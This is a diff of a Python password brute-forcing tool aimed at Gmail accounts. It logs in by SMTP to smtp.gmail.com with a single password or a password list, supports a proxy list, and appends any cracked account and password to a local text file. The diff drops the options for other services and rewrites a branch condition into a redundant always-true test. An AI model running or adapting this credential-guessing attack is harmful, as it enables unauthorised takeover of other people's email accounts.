@@ -55,10 +55,6 @@ _____________________                              _____________________
 							   """.format(G,R))
 
 use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
-use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
-use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
-use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
-use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -99,16 +95,16 @@ if options.gmail == None  :
                     exit()       
     
 
-elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
+elif options.gmail !=None or  options.gmail== None or options.gmail==None:  
     smtp_srverG= smtplib.SMTP('smtp.gmail.com', 587)
     smtp_srverG.ehlo()
     smtp_srverG.starttls()
     if options.password != None or options.list_password == None  :
-        print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
+        print("%s<<<<<<+++++Comece a atacar e-mail+++++>>>>>%s"%(R,W))
         try :    
             smtp_srverG.login(options.gmail,options.password)
             print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
-            Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
+            Save = io.open("gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
         except :
             print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
     elif options.list_password !=None:
